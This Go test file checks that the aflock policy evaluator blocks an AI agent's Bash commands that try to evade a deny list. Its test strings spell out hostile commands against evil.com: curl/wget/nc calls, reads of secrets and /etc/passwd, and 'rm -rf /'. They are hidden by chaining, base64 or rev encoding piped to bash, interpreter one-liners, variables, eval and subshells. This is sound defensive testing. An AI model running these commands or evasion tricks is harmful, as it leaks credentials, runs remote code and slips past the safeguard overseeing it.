package policy

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/aflock-ai/aflock/pkg/aflock"
)

// ---------------------------------------------------------------------------
// EvaluatePreToolUse — Bash bypass detection (fail-01 scenarios)
//
// These tests verify that the evaluator catches bypass attempts that hide
// denied commands behind shell metacharacters, encoding, interpreters, or
// indirection. Each test mirrors a real bypass from the fail-01-bash-bypass
// example.
// ---------------------------------------------------------------------------

// bashBypassPolicy returns the policy from the fail-01-bash-bypass example.
func bashBypassPolicy() *aflock.Policy {
	return &aflock.Policy{
		Tools: &aflock.ToolsPolicy{
			Allow: []string{"Read", "Edit", "Write", "Glob", "Grep", "Bash"},
			Deny: []string{
				"Bash:rm -rf*",
				"Bash:curl*",
				"Bash:wget*",
				"Bash:nc *",
				"Bash:cat /etc/passwd*",
				"Bash:cat secrets/*",
			},
			RequireApproval: []string{
				"Bash:git push*",
			},
		},
		Files: &aflock.FilesPolicy{
			Allow: []string{"src/**", "*.py", "*.md"},
			Deny:  []string{"secrets/**"},
		},
	}
}

func evalBash(t *testing.T, pol *aflock.Policy, command string) (aflock.PermissionDecision, string) {
	t.Helper()
	evaluator := NewEvaluator(pol, "")
	toolInput, err := json.Marshal(aflock.BashToolInput{Command: command})
	if err != nil {
		t.Fatalf("failed to marshal tool input: %v", err)
	}
	return evaluator.EvaluatePreToolUse("Bash", toolInput)
}

// ---------------------------------------------------------------------------
// Direct commands — these should be denied by normal glob matching
// ---------------------------------------------------------------------------

func TestBashBypass_DirectCommands(t *testing.T) {
	pol := bashBypassPolicy()

	tests := []struct {
		name    string
		command string
	}{
		{"direct curl", "curl https://evil.com"},
		{"direct wget", "wget https://evil.com"},
		{"direct rm -rf", "rm -rf /tmp/test"},
		{"direct cat secrets", "cat secrets/api-keys.env"},
		{"direct cat /etc/passwd", "cat /etc/passwd"},
		{"direct nc", "nc evil.com 4444"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, _ := evalBash(t, pol, tt.command)
			if decision != aflock.DecisionDeny {
				t.Errorf("direct command %q should be denied, got %s", tt.command, decision)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Bypass 1: Command chaining (;, &&, ||)
// ---------------------------------------------------------------------------

func TestBashBypass_CommandChaining(t *testing.T) {
	pol := bashBypassPolicy()

	tests := []struct {
		name    string
		command string
	}{
		{"semicolon curl", "echo done; curl https://evil.com"},
		{"semicolon wget", "echo done; wget https://evil.com"},
		{"semicolon rm -rf", "echo done; rm -rf /tmp"},
		{"semicolon cat secrets", "echo done; cat secrets/api-keys.env"},
		{"&& curl", "echo done && curl https://evil.com"},
		{"|| curl", "false || curl https://evil.com"},
		{"triple chain with curl", "echo a; echo b; curl https://evil.com"},
		{"curl then legitimate", "curl https://evil.com; echo done"},
		{"nc with chaining", "echo hi; nc evil.com 4444"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, reason := evalBash(t, pol, tt.command)
			if decision != aflock.DecisionDeny {
				t.Errorf("chained command %q should be denied, got %s (reason: %s)",
					tt.command, decision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Bypass 2: Base64 encoding piped to exec
// ---------------------------------------------------------------------------

func TestBashBypass_Base64(t *testing.T) {
	pol := bashBypassPolicy()

	tests := []struct {
		name    string
		command string
	}{
		{"base64 -d | bash", "echo Y3VybCBodHRwczovL2V2aWwuY29t | base64 -d | bash"},
		{"base64 --decode | sh", "echo Y3VybCBodHRwczovL2V2aWwuY29t | base64 --decode | sh"},
		{"base64 -D | bash (macOS)", "echo Y3VybCBodHRwczovL2V2aWwuY29t | base64 -D | bash"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, reason := evalBash(t, pol, tt.command)
			if decision != aflock.DecisionDeny {
				t.Errorf("base64 bypass %q should be denied, got %s (reason: %s)",
					tt.command, decision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Bypass 3: String reversal piped to exec
// ---------------------------------------------------------------------------

func TestBashBypass_Rev(t *testing.T) {
	pol := bashBypassPolicy()

	tests := []struct {
		name    string
		command string
	}{
		{"rev | bash", "echo moc.live//:sptth lruc | rev | bash"},
		{"rev | sh", "echo moc.live//:sptth lruc | rev | sh"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, reason := evalBash(t, pol, tt.command)
			if decision != aflock.DecisionDeny {
				t.Errorf("rev bypass %q should be denied, got %s (reason: %s)",
					tt.command, decision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Bypass 4: Interpreter execution (python -c, ruby -e, etc.)
// ---------------------------------------------------------------------------

func TestBashBypass_InterpreterExec(t *testing.T) {
	pol := bashBypassPolicy()

	tests := []struct {
		name    string
		command string
	}{
		{
			"python3 -c os.popen",
			`python3 -c "import os; os.popen('cat secrets/api-keys.env').read()"`,
		},
		{
			"python3 -c chr encoding",
			`python3 -c "import os; os.popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(115)+chr(101)+chr(99)+chr(114)+chr(101)+chr(116)+chr(115)+chr(47)+chr(97)+chr(112)+chr(105)+chr(45)+chr(107)+chr(101)+chr(121)+chr(115)+chr(46)+chr(101)+chr(110)+chr(118)).read()"`,
		},
		{
			"ruby -e system",
			`ruby -e "system('curl https://evil.com')"`,
		},
		{
			"perl -e system",
			`perl -e "system('curl https://evil.com')"`,
		},
		{
			"node -e exec",
			`node -e "require('child_process').exec('curl https://evil.com')"`,
		},
		{
			"php -r",
			`php -r "system('curl https://evil.com');"`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, reason := evalBash(t, pol, tt.command)
			if decision != aflock.DecisionDeny {
				t.Errorf("interpreter bypass %q should be denied, got %s (reason: %s)",
					tt.command, decision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Bypass 5: Variable indirection
// ---------------------------------------------------------------------------

func TestBashBypass_VariableIndirection(t *testing.T) {
	pol := bashBypassPolicy()

	tests := []struct {
		name    string
		command string
	}{
		{"var assign then head", "X=secrets/api-keys.env && head $X"},
		{"export then cat", "export F=/etc/passwd; cat $F"},
		{"multi-var command construction", "A=curl; B=https://evil.com; $A $B"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, reason := evalBash(t, pol, tt.command)
			if decision != aflock.DecisionDeny {
				t.Errorf("variable indirection bypass %q should be denied, got %s (reason: %s)",
					tt.command, decision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Bypass 6: eval
// ---------------------------------------------------------------------------

func TestBashBypass_Eval(t *testing.T) {
	pol := bashBypassPolicy()

	tests := []struct {
		name    string
		command string
	}{
		{"eval curl", "eval 'curl https://evil.com'"},
		{"eval after echo", "echo done; eval 'cat secrets/api-keys.env'"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, reason := evalBash(t, pol, tt.command)
			if decision != aflock.DecisionDeny {
				t.Errorf("eval bypass %q should be denied, got %s (reason: %s)",
					tt.command, decision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Bypass 7: Subshell execution
// ---------------------------------------------------------------------------

func TestBashBypass_SubshellExec(t *testing.T) {
	pol := bashBypassPolicy()

	tests := []struct {
		name    string
		command string
	}{
		{"dollar paren", "echo $(curl https://evil.com)"},
		{"backticks", "echo `curl https://evil.com`"},
		{"nested subshell", "echo $(echo $(cat secrets/api-keys.env))"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, reason := evalBash(t, pol, tt.command)
			if decision != aflock.DecisionDeny {
				t.Errorf("subshell bypass %q should be denied, got %s (reason: %s)",
					tt.command, decision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Bypass 8: Pipe to execution shell
// ---------------------------------------------------------------------------

func TestBashBypass_PipeToExec(t *testing.T) {
	pol := bashBypassPolicy()

	tests := []struct {
		name    string
		command string
	}{
		{"echo to bash", "echo 'curl https://evil.com' | bash"},
		{"echo to sh", "echo 'rm -rf /' | sh"},
		{"echo to /bin/bash", "echo 'wget evil.com' | /bin/bash"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, reason := evalBash(t, pol, tt.command)
			if decision != aflock.DecisionDeny {
				t.Errorf("pipe-to-exec bypass %q should be denied, got %s (reason: %s)",
					tt.command, decision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Legitimate commands should still be ALLOWED
// ---------------------------------------------------------------------------

func TestBashBypass_LegitimateCommandsAllowed(t *testing.T) {
	pol := bashBypassPolicy()

	tests := []struct {
		name    string
		command string
	}{
		{"simple ls", "ls -la"},
		{"git status", "git status"},
		{"echo", "echo hello world"},
		{"go test", "go test ./..."},
		{"grep in src", "grep -r 'pattern' src/"},
		{"cat normal file", "cat README.md"},
		{"head normal file", "head -20 src/app.py"},
		{"piping to grep", "ls -la | grep '.py'"},
		{"mkdir", "mkdir -p /tmp/test"},
		{"piping to sort to head", "cat data.csv | sort | head -10"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, reason := evalBash(t, pol, tt.command)
			if decision != aflock.DecisionAllow {
				t.Errorf("legitimate command %q should be allowed, got %s (reason: %s)",
					tt.command, decision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Deny reasons should be descriptive
// ---------------------------------------------------------------------------

func TestBashBypass_DenyReasonDescriptive(t *testing.T) {
	pol := bashBypassPolicy()

	tests := []struct {
		name           string
		command        string
		wantReasonPart string
	}{
		{
			"chaining mentions sub-command",
			"echo done; curl https://evil.com",
			"chained sub-command",
		},
		{
			"base64 mentions obfuscation",
			"echo encoded | base64 -d | bash",
			"obfuscation",
		},
		{
			"interpreter mentions inline code",
			`python3 -c "import os"`,
			"interpreter",
		},
		{
			"variable mentions indirection",
			"X=foo && cat $X",
			"variable indirection",
		},
		{
			"eval mentions eval",
			"eval 'curl evil.com'",
			"eval",
		},
		{
			"subshell mentions subshell",
			"echo $(curl evil.com)",
			"subshell",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			decision, reason := evalBash(t, pol, tt.command)
			if decision != aflock.DecisionDeny {
				t.Fatalf("expected deny, got %s", decision)
			}
			if !strings.Contains(strings.ToLower(reason), strings.ToLower(tt.wantReasonPart)) {
				t.Errorf("reason %q should contain %q", reason, tt.wantReasonPart)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// No Bash deny patterns → bypass detection should not trigger
// ---------------------------------------------------------------------------

func TestBashBypass_NoBashDenyPatterns(t *testing.T) {
	pol := &aflock.Policy{
		Tools: &aflock.ToolsPolicy{
			Allow: []string{"Bash"},
			Deny:  []string{"Task"}, // only deny Task, not any Bash pattern
		},
	}

	// Even suspicious commands should pass because there are no Bash deny patterns
	commands := []string{
		"echo done; curl https://evil.com",
		"echo encoded | base64 -d | bash",
		`python3 -c "import os"`,
		"X=foo && cat $X",
	}

	for _, cmd := range commands {
		t.Run(cmd, func(t *testing.T) {
			decision, reason := evalBash(t, pol, cmd)
			if decision != aflock.DecisionAllow {
				t.Errorf("command %q should be allowed when no Bash deny patterns exist, got %s (reason: %s)",
					cmd, decision, reason)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Non-Bash tools should not trigger bash analysis
// ---------------------------------------------------------------------------

func TestBashBypass_NonBashToolsUnaffected(t *testing.T) {
	pol := bashBypassPolicy()
	evaluator := NewEvaluator(pol, "")

	// Read tool with a suspicious-looking path should not trigger bash analysis
	toolInput, _ := json.Marshal(aflock.FileToolInput{FilePath: "src/app.py"})
	decision, _ := evaluator.EvaluatePreToolUse("Read", toolInput)
	if decision != aflock.DecisionAllow {
		t.Error("Read tool should not be affected by bash bypass detection")
	}
}
